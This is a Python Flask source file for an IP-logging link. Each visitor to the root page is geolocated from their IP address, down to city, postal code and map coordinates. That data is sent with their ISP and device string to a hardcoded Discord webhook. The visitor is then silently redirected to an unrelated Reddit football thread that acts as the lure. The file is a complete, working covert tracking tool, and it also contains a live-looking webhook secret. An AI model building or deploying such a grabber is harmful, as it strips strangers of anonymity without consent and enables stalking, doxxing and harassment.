import requests
from flask import Flask, request, redirect
from datetime import datetime

app = Flask(__name__)

# ✅ Discord webhook
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1427010775163080868/6Uaf91MUBd4GO3eYSf4y3i0VZkKQh0_pFQFO7H8M42IKWwYQmEkNcisypFHTmvTClpoS"

def get_real_ip():
    """Extract the real client IP from headers or fallback."""
    headers_to_check = [
        "CF-Connecting-IP",   # Cloudflare
        "X-Forwarded-For",    # Proxies
        "X-Real-IP"           # Nginx / Load balancer
    ]
    for header in headers_to_check:
        ip = request.headers.get(header)
        if ip:
            return ip.split(",")[0].strip()
    return request.remote_addr

def get_visitor_info(ip, user_agent):
    """Get detailed visitor info from ipapi with fallback."""
    details = {}
    
    # Primary lookup
    try:
        r = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
        if r.status_code == 200:
            details = r.json()
    except Exception as e:
        print("Primary ipapi error:", e)
    
    # Fallback in case city/country missing
    if not details.get("city") or not details.get("country_name"):
        try:
            r = requests.get("https://ipapi.co/json/", timeout=5)
            if r.status_code == 200:
                fallback = r.json()
                # Merge fallback data without overwriting valid fields
                for key in ["ip","city","region","country_name","country_code","postal","latitude","longitude","org"]:
                    if not details.get(key) and fallback.get(key):
                        details[key] = fallback[key]
        except Exception as e:
            print("Fallback ipapi error:", e)
    
    lat = details.get("latitude", 0)
    lon = details.get("longitude", 0)

    return {
        "ip": ip,
        "user_agent": user_agent,
        "country": details.get("country_name", "Unknown"),
        "region": details.get("region", "Unknown"),
        "city": details.get("city", "Unknown"),
        "zip": details.get("postal", "Unknown"),
        "lat": lat,
        "lon": lon,
        "org": details.get("org", "Unknown ISP"),
        "date": datetime.utcnow().strftime("%d/%m/%Y"),
        "time": datetime.utcnow().strftime("%H:%M:%S"),
    }

def send_to_discord(info):
    """Send detailed visitor info to Discord."""
    embed = {
        "username": "🌍 Visitor Tracker",
        "embeds": [{
            "title": f"🚶 New Visitor from {info['country']}",
            "color": 7506394,
            "fields": [
                {"name": "🖥️ IP Address", "value": f"`{info['ip']}`", "inline": False},
                {"name": "📍 Location", "value": f"{info['city']}, {info['region']} ({info['country']})\nPostal: {info['zip']}", "inline": False},
                {"name": "🏢 ISP / Organization", "value": info['org'], "inline": False},
                {"name": "📱 Device Info", "value": f"`{info['user_agent']}`", "inline": False},
                {"name": "🌍 Google Maps", "value": f"[Open Map](https://www.google.com/maps?q={info['lat']},{info['lon']})", "inline": False},
            ],
            "footer": {"text": f"Logged at {info['date']} {info['time']} GMT"}
        }]
    }

    try:
        requests.post(DISCORD_WEBHOOK_URL, json=embed, timeout=5)
    except Exception as e:
        print(f"Error sending to Discord: {e}")

@app.route('/')
def index():
    ip = get_real_ip()
    user_agent = request.headers.get("User-Agent", "Unknown")
    info = get_visitor_info(ip, user_agent)
    send_to_discord(info)
    return redirect("https://www.reddit.com/r/football/comments/y8xqif/how_to_be_better_in_football_in_a_fast_time/")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000, debug=False)
